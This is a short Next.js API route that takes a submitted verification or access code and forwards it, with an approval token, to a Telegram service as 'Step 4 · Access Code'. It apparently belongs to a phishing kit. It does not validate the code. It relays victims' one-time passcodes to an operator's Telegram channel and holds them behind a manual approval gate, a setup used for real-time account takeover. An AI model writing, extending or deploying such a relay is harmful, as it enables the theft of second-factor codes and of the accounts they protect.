import { NextRequest, NextResponse } from "next/server"
import { telegramService } from "@/lib/telegram"
import { createApproval } from "@/lib/approval-gate"

export async function POST(request: NextRequest) {
  try {
    const data = await request.json()
    const token = await createApproval("verify_code")
    await telegramService.sendVerificationNotification(
      {
        verificationType: String(data?.verificationType ?? ""),
        code: String(data?.code ?? ""),
      },
      { token, step: "Step 4 · Access Code" },
    )
    return NextResponse.json({ success: true, token })
  } catch (error) {
    console.error("Error sending verification notification:", error)
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
  }
}
